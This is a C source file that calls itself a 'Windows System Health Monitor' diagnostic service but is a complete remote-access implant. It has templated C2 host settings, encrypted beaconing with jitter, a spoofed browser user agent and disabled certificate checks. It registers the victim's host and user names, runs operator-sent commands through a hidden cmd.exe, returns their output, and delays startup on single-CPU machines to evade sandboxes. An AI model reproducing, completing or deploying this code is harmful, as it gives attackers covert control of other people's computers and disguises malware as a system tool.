/*
 * Windows System Health Monitor — Endpoint diagnostic service
 * Lightweight C implementation with minimal footprint (~50KB compiled)
 *
 * Build: x86_64-w64-mingw32-gcc -o svchealth.exe agent.c ghost_data.c -lwinhttp -lbcrypt -s -Os
 */

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "winhttp")
#pragma comment(lib, "bcrypt")

#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | \
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID | \
    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE)
#endif

/* Build-time configuration — replaced by generator */
#define C2_HOST L"{{C2_HOST}}"
#define C2_PORT {{C2_PORT}}
#define C2_PATH_REGISTER L"{{REGISTER_URI}}"
#define C2_PATH_CHECKIN L"{{CHECKIN_URI}}"
#define C2_PATH_RESULT L"{{RESULT_URI}}"
#define ENC_KEY "{{ENCRYPTION_KEY}}"
#define BEACON_SLEEP {{BEACON_INTERVAL}}
#define BEACON_JITTER {{BEACON_JITTER}}
#define USE_HTTPS {{USE_HTTPS}}
#define SERVER_PUB "{{SERVER_X25519_PUB}}"

static char g_agent_id[64] = {0};

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* base64_encode(const unsigned char *data, size_t len, size_t *out_len) {
    size_t olen = 4 * ((len + 2) / 3);
    char *out = (char*)malloc(olen + 1);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        unsigned int v = data[i] << 16;
        if (i + 1 < len) v |= data[i+1] << 8;
        if (i + 2 < len) v |= data[i+2];
        out[j] = b64_table[(v >> 18) & 0x3F];
        out[j+1] = b64_table[(v >> 12) & 0x3F];
        out[j+2] = (i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=';
        out[j+3] = (i + 2 < len) ? b64_table[v & 0x3F] : '=';
    }
    out[olen] = '\0';
    if (out_len) *out_len = olen;
    return out;
}

static unsigned char* base64_decode(const char *data, size_t len, size_t *out_len) {
    unsigned char dtable[256] = {0};
    for (int i = 0; i < 64; i++) dtable[(unsigned char)b64_table[i]] = i;
    size_t olen = len / 4 * 3;
    unsigned char *out = (unsigned char*)malloc(olen);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        unsigned int v = (dtable[(unsigned char)data[i]] << 18) |
                         (dtable[(unsigned char)data[i+1]] << 12) |
                         (dtable[(unsigned char)data[i+2]] << 6) |
                          dtable[(unsigned char)data[i+3]];
        out[j] = (v >> 16) & 0xFF;
        if (data[i+2] != '=') out[j+1] = (v >> 8) & 0xFF;
        if (data[i+3] != '=') out[j+2] = v & 0xFF;
    }
    if (data[len-1] == '=') olen--;
    if (data[len-2] == '=') olen--;
    if (out_len) *out_len = olen;
    return out;
}

/* SHA-256 key derivation via BCrypt */
static int derive_key(unsigned char out_key[32]) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    const char *key = ENC_KEY;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;

    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    BCryptHashData(hHash, (PUCHAR)key, (ULONG)strlen(key), 0);
    BCryptFinishHash(hHash, out_key, 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 1;
}

void x25519(unsigned char *q, const unsigned char *n, const unsigned char *p);
void x25519_base(unsigned char *q, const unsigned char *n);

static int hmac_sha256(const unsigned char *key, ULONG key_len, const unsigned char *data, ULONG data_len, unsigned char out[32]) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(status)) return 0;
    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, key_len, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }
    BCryptHashData(hHash, (PUCHAR)data, data_len, 0);
    BCryptFinishHash(hHash, out, 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 1;
}

static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int parse_hex32(const char *hex, unsigned char out[32]) {
    for (int i = 0; i < 32; i++) {
        int hi = hex_nibble(hex[i * 2]), lo = hex_nibble(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) return 0;
        out[i] = (unsigned char)((hi << 4) | lo);
    }
    return 1;
}

static void hkdf32(const unsigned char *ikm, int ikm_len, const char *info, unsigned char out[32]) {
    unsigned char prk[32], msg[80];
    int n = (int)strlen(info);
    hmac_sha256((const unsigned char *)"sockpuppets-salt-v1", 20, ikm, (ULONG)ikm_len, prk);
    memcpy(msg, info, n);
    msg[n] = 1;
    hmac_sha256(prk, 32, msg, (ULONG)(n + 1), out);
}

static unsigned char *aes_gcm_raw(const unsigned char key[32], const unsigned char *data, size_t len, size_t *out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return NULL;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    unsigned char nonce[12], tag[16];
    BCryptGenRandom(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;
    DWORD ct_len = 0;
    BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, NULL, 0, &ct_len, 0);
    unsigned char *buf = (unsigned char *)malloc(12 + ct_len + 16);
    DWORD wrote = 0;
    NTSTATUS status = BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, buf + 12, ct_len, &wrote, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(status)) { free(buf); return NULL; }
    memcpy(buf, nonce, 12);
    memcpy(buf + 12 + wrote, tag, 16);
    *out_len = 12 + wrote + 16;
    return buf;
}

static char *aes_gcm_open_raw(const unsigned char key[32], const unsigned char *blob, size_t len) {
    if (len < 12 + 16) return NULL;
    size_t ct_len = len - 12 - 16;
    unsigned char tag[16];
    memcpy(tag, blob + 12 + ct_len, 16);
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return NULL;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)blob;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;
    char *pt = (char *)malloc(ct_len + 1);
    DWORD pt_len = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)blob + 12, (ULONG)ct_len, &authInfo, NULL, 0, (PUCHAR)pt, (ULONG)ct_len, &pt_len, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(status)) { free(pt); return NULL; }
    pt[pt_len] = 0;
    return pt;
}

static unsigned char g_session[32], g_hs[32], g_eph[32];
static int g_have_session = 0, g_have_eph = 0;

static char *wire_encrypt(const char *data, size_t len) {
    if (g_have_session) {
        size_t slen = 0;
        unsigned char *sealed = aes_gcm_raw(g_session, (const unsigned char *)data, len, &slen);
        if (!sealed) return NULL;
        unsigned char *framed = (unsigned char *)malloc(4 + slen);
        memcpy(framed, "AES1", 4);
        memcpy(framed + 4, sealed, slen);
        free(sealed);
        size_t b64len;
        char *out = base64_encode(framed, 4 + slen, &b64len);
        free(framed);
        return out;
    }
    unsigned char server_pub[32];
    if (!parse_hex32(SERVER_PUB, server_pub)) return NULL;
    BCryptGenRandom(NULL, g_eph, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    unsigned char eph_pub[32], shared[32];
    x25519_base(eph_pub, g_eph);
    x25519(shared, g_eph, server_pub);
    hkdf32(shared, 32, "sockpuppets-handshake-v1", g_hs);
    g_have_eph = 1;
    size_t slen = 0;
    unsigned char *sealed = aes_gcm_raw(g_hs, (const unsigned char *)data, len, &slen);
    if (!sealed) return NULL;
    unsigned char *raw = (unsigned char *)malloc(32 + slen);
    memcpy(raw, eph_pub, 32);
    memcpy(raw + 32, sealed, slen);
    free(sealed);
    size_t b64len;
    char *b64 = base64_encode(raw, 32 + slen, &b64len);
    free(raw);
    char *out = (char *)malloc(5 + b64len + 1);
    memcpy(out, "EPH1.", 5);
    memcpy(out + 5, b64, b64len + 1);
    free(b64);
    return out;
}

static char *wire_decrypt(const char *data) {
    if (strncmp(data, "EPH2.", 5) == 0) {
        size_t rawlen;
        unsigned char *raw = base64_decode(data + 5, strlen(data + 5), &rawlen);
        if (!raw || rawlen < 32 || !g_have_eph) { free(raw); return NULL; }
        unsigned char shared2[32];
        x25519(shared2, g_eph, raw);
        unsigned char ikm[64];
        memcpy(ikm, shared2, 32);
        memcpy(ikm + 32, g_hs, 32);
        hkdf32(ikm, 64, "sockpuppets-session-v1", g_session);
        g_have_session = 1;
        g_have_eph = 0;
        char *pt = aes_gcm_open_raw(g_hs, raw + 32, rawlen - 32);
        free(raw);
        return pt;
    }
    size_t rawlen;
    unsigned char *raw = base64_decode(data, strlen(data), &rawlen);
    if (!raw || rawlen < 4 || memcmp(raw, "AES1", 4) != 0 || !g_have_session) { free(raw); return NULL; }
    char *pt = aes_gcm_open_raw(g_session, raw + 4, rawlen - 4);
    free(raw);
    return pt;
}

/* AES-256-GCM encrypt: returns base64("AES1" + nonce12 + ciphertext + tag16) */
static char* aes_encrypt(const char *data, size_t len) {
    if (SERVER_PUB[0] != '{') {
        char *wired = wire_encrypt(data, len);
        if (wired) return wired;
    }
    unsigned char key[32];
    if (!derive_key(key)) return NULL;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return NULL;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return NULL; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return NULL; }

    unsigned char nonce[12];
    BCryptGenRandom(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    unsigned char tag[16];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;

    DWORD ct_len = 0;
    BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, NULL, 0, &ct_len, 0);
    unsigned char *ct = (unsigned char*)malloc(ct_len);
    status = BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, ct, ct_len, &ct_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) { free(ct); return NULL; }

    /* Build: "AES1" (4) + nonce (12) + ct + tag (16) */
    size_t total = 4 + 12 + ct_len + 16;
    unsigned char *buf = (unsigned char*)malloc(total);
    memcpy(buf, "AES1", 4);
    memcpy(buf + 4, nonce, 12);
    memcpy(buf + 16, ct, ct_len);
    memcpy(buf + 16 + ct_len, tag, 16);
    free(ct);

    size_t b64len;
    char *result = base64_encode(buf, total, &b64len);
    free(buf);
    return result;
}

/* AES-256-GCM decrypt: input is base64("AES1" + nonce12 + ciphertext + tag16) */
static char* aes_decrypt(const char *b64data) {
    if (SERVER_PUB[0] != '{') {
        char *wired = wire_decrypt(b64data);
        if (wired) return wired;
    }
    size_t rawlen;
    unsigned char *raw = base64_decode(b64data, strlen(b64data), &rawlen);
    if (!raw) return NULL;

    /* Check AES1 prefix */
    if (rawlen > 4 && memcmp(raw, "AES1", 4) == 0) {
        if (rawlen < 4 + 12 + 16) { free(raw); return NULL; }

        unsigned char key[32];
        if (!derive_key(key)) { free(raw); return NULL; }

        unsigned char *nonce = raw + 4;
        size_t ct_len = rawlen - 4 - 12 - 16;
        unsigned char *ct = raw + 16;
        unsigned char tag[16];
        memcpy(tag, raw + 16 + ct_len, 16);

        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;

        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = nonce;
        authInfo.cbNonce = 12;
        authInfo.pbTag = tag;
        authInfo.cbTag = 16;

        unsigned char *pt = (unsigned char*)malloc(ct_len + 1);
        DWORD pt_len = 0;
        NTSTATUS status = BCryptDecrypt(hKey, ct, (ULONG)ct_len, &authInfo, NULL, 0,
                                         pt, (ULONG)ct_len, &pt_len, 0);

        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(raw);

        if (!BCRYPT_SUCCESS(status)) { free(pt); return NULL; }
        pt[pt_len] = '\0';
        return (char*)pt;
    }

    /* XOR fallback for legacy */
    const char *key = ENC_KEY;
    size_t klen = strlen(key);
    char *dec = (char*)malloc(rawlen + 1);
    for (size_t i = 0; i < rawlen; i++)
        dec[i] = raw[i] ^ key[i % klen];
    dec[rawlen] = '\0';
    free(raw);
    return dec;
}

static char* http_post(const wchar_t *path, const char *data) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    DWORD flags = USE_HTTPS ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    if (USE_HTTPS) {
        DWORD opt = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/x-www-form-urlencoded\r\n"
        L"Accept: text/html,*/*\r\n",
        -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)data, (DWORD)strlen(data), (DWORD)strlen(data), 0);
    if (!sent || !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return NULL;
    }

    char *response = NULL;
    size_t total = 0;
    DWORD bytesRead;
    char buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        response = (char*)realloc(response, total + bytesRead + 1);
        memcpy(response + total, buf, bytesRead);
        total += bytesRead;
    }
    if (response) response[total] = '\0';

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

static int g_beacon_sleep = BEACON_SLEEP;

static char* execute_command(const char *cmd) {
    if (strncmp(cmd, "__hd:", 5) == 0) {
        const char *msg = "hidden desktop requires the windows go agent";
        char *out = (char *)malloc(strlen(msg) + 1);
        if (!out) return NULL;
        memcpy(out, msg, strlen(msg) + 1);
        return out;
    }
    if (strncmp(cmd, "cd ", 3) == 0) {
        const char *dir = cmd + 3;
        while (*dir == ' ') dir++;
        if (SetCurrentDirectoryA(dir)) {
            char cwd[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, cwd);
            char *result = (char*)malloc(MAX_PATH + 32);
            snprintf(result, MAX_PATH + 32, "Changed directory to %s", cwd);
            return result;
        } else {
            return _strdup("Error: directory not found");
        }
    }

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    PROCESS_INFORMATION pi;

    char cmdline[2048];
    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", cmd);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return _strdup("Error: CreateProcess failed");
    }
    CloseHandle(hWrite);

    char *output = NULL;
    size_t total = 0;
    DWORD bytesRead;
    char buf[4096];
    while (ReadFile(hRead, buf, sizeof(buf)-1, &bytesRead, NULL) && bytesRead > 0) {
        output = (char*)realloc(output, total + bytesRead + 1);
        memcpy(output + total, buf, bytesRead);
        total += bytesRead;
    }
    if (output) output[total] = '\0';
    else output = _strdup("Command executed (no output)");

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}

/* JSON string escaping for output */
static char* json_escape(const char *input) {
    if (!input) return _strdup("");
    size_t len = strlen(input);
    char *out = (char*)malloc(len * 2 + 1);
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        switch (input[i]) {
            case '\\': out[j++] = '\\'; out[j++] = '\\'; break;
            case '"':  out[j++] = '\\'; out[j++] = '"'; break;
            case '\n': out[j++] = '\\'; out[j++] = 'n'; break;
            case '\r': out[j++] = '\\'; out[j++] = 'r'; break;
            case '\t': out[j++] = '\\'; out[j++] = 't'; break;
            default: out[j++] = input[i]; break;
        }
    }
    out[j] = '\0';
    return out;
}

static int do_register(void) {
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"type\":\"register\",\"metadata\":{\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os\":\"Windows\",\"architecture\":\"x86_64\",\"mode\":\"beacon\",\"beacon_interval\":%d}}",
        hostname, username, BEACON_SLEEP);

    char *enc = aes_encrypt(json, strlen(json));
    if (!enc) return 0;

    char *resp = http_post(C2_PATH_REGISTER, enc);
    free(enc);
    if (!resp) return 0;

    char *dec = aes_decrypt(resp);
    free(resp);
    if (!dec) return 0;

    char *id_start = strstr(dec, "\"agent_id\":\"");
    if (id_start) {
        id_start += 12;
        char *id_end = strchr(id_start, '"');
        if (id_end && (id_end - id_start) < (int)sizeof(g_agent_id)) {
            memcpy(g_agent_id, id_start, id_end - id_start);
            g_agent_id[id_end - id_start] = '\0';
        }
    }
    free(dec);
    return g_agent_id[0] != '\0';
}

static void beacon_loop(void) {
    char *pending_results = NULL;
    size_t pending_len = 0;

    while (1) {
        char *results_json = pending_results ? pending_results : _strdup("[]");
        pending_results = NULL;
        pending_len = 0;

        char *json_buf = (char*)malloc(strlen(results_json) + 256);
        snprintf(json_buf, strlen(results_json) + 256,
            "{\"type\":\"checkin\",\"agent_id\":\"%s\",\"metadata\":{\"mode\":\"beacon\"},\"results\":%s}",
            g_agent_id, results_json);
        free(results_json);

        char *enc = aes_encrypt(json_buf, strlen(json_buf));
        free(json_buf);
        char *resp = enc ? http_post(C2_PATH_CHECKIN, enc) : NULL;
        if (enc) free(enc);

        if (resp) {
            char *dec = aes_decrypt(resp);
            free(resp);
            if (dec) {
                char *cmd_start = strstr(dec, "\"command\":");
                while (cmd_start) {
                    cmd_start += 10;
                    while (*cmd_start == ' ' || *cmd_start == '\t') cmd_start++;
                    if (*cmd_start != '"') break;
                    cmd_start++;
                    char *cmd_end = strchr(cmd_start, '"');
                    if (!cmd_end) break;

                    char command[1024] = {0};
                    size_t cmdlen = cmd_end - cmd_start;
                    if (cmdlen >= sizeof(command)) cmdlen = sizeof(command) - 1;
                    memcpy(command, cmd_start, cmdlen);

                    if (strcmp(command, "__kill") == 0) {
                        free(dec);
                        ExitProcess(0);
                    }

                    if (strncmp(command, "__set_interval:", 15) == 0) {
                        g_beacon_sleep = atoi(command + 15);
                        if (g_beacon_sleep < 1) g_beacon_sleep = 1;
                        cmd_start = strstr(cmd_end, "\"command\":\"");
                        continue;
                    }

                    char *output = execute_command(command);
                    char *escaped = json_escape(output);

                    char *result_json = (char*)malloc(strlen(escaped) + strlen(command) + 256);
                    snprintf(result_json, strlen(escaped) + strlen(command) + 256,
                        "{\"type\":\"response\",\"output\":\"%s\",\"command\":\"%s\"}",
                        escaped, command);
                    free(escaped);
                    free(output);

                    if (!pending_results) {
                        pending_results = (char*)malloc(strlen(result_json) + 3);
                        snprintf(pending_results, strlen(result_json) + 3, "[%s]", result_json);
                    } else {
                        size_t old_len = strlen(pending_results);
                        pending_results = (char*)realloc(pending_results, old_len + strlen(result_json) + 2);
                        pending_results[old_len - 1] = ',';
                        memcpy(pending_results + old_len, result_json, strlen(result_json));
                        pending_results[old_len + strlen(result_json)] = ']';
                        pending_results[old_len + strlen(result_json) + 1] = '\0';
                    }
                    free(result_json);

                    cmd_start = strstr(cmd_end, "\"command\":\"");
                }
                free(dec);
            }
        }

        int sleep_ms = g_beacon_sleep * 1000;
        if (BEACON_JITTER > 0) {
            int jitter = (sleep_ms * BEACON_JITTER) / 100;
            sleep_ms = sleep_ms - jitter + (rand() % (jitter * 2 + 1));
        }
        if (sleep_ms < 1000) sleep_ms = 1000;
        Sleep(sleep_ms);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) Sleep(30000);

    int retries = 0;
    while (!do_register() && retries < 10) {
        Sleep(5000);
        retries++;
    }
    if (g_agent_id[0] == '\0') return 1;

    beacon_loop();
    return 0;
}
